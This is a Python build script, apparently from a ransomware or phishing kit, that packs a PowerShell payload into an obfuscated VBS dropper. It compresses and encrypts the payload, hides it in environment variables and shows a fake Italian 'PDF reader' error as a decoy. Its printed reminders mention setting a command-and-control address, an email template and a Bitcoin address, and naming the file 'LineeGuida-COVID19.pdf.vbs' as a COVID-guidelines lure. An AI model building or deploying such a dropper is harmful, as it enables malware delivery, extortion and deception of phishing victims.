import subprocess
import gzip
import base64

print('''WARNING: remember to:
         1. change C&C address in part3.ps1
         2. chanche C&C in email_template.html
         3. change BTC address in common.php
         4. move the just generated script in C&C server root path with name "LineeGuida-COVID19.pdf.vbs"''')

with open('../part3.ps1', 'r') as content_file:
    content = content_file.read()
    zipped = gzip.compress(bytes(content,'utf-8'))
    compressed = base64.b64encode(b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff' + zipped[10:])
    output = subprocess.check_output(['C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', "./'powershell-encrypter.ps1'", compressed]).strip()

with open('../part2.ps1', 'r') as content_file:
    encrypted = "$encrypted=\"" + output.decode("utf-8") + "\";\n"
    newFile = encrypted + content_file.read()
    full = base64.b64encode(bytes(newFile, "utf-8"))

f = open("../script.vbs", "w")
f.write("Set osi = CreateObject(\"Wscript.shell\")\n")
f.write("Set wev = osi.Environment(\"Process\")\n")
f.write("x=msgbox(\"Impossibile leggere il file. Il PDF Reader utilizzato non supporta questo formato\", 48, \"Warning\")\n")

substr = ""
varIndex = 0
lines = []
vars = []
for index, char in enumerate(full.decode("utf-8"), start=1):
    substr += char
    if index % 1000 == 0:
        var = "XXX" + str(varIndex)
        lines.append("wev(\"" + var + "\") = \"" + substr + "\"\n")
        substr = ""
        varIndex += 1
        vars.append(var)

var = "XXX" + str(varIndex)
lines.append("wev(\"" + var + "\") = \"" + substr + "\"\n")
vars.append(var)
f.writelines(lines)

xxx = ""
for var in vars:
    xxx += "$env:" + var + "+"
xxx = xxx[:-1]

output = subprocess.check_output(['C:\\Windows\\System32\\cscript.exe', "/nologo", "./vbs-encrypter.vbs", xxx]).strip()
f.write('txt = "'+ output.decode("utf-8") + '"\n')
f.write("osi.run decode(txt), 1, True\n")

f.write("""
function decode(s)
    For i = 1 To Len(s)
        newtxt = Mid(s,i,1)
        newtxt = Chr(Asc(newtxt) - 3)
        coded = coded + (newtxt)
    Next
    decode = coded
End function""")

f.close()


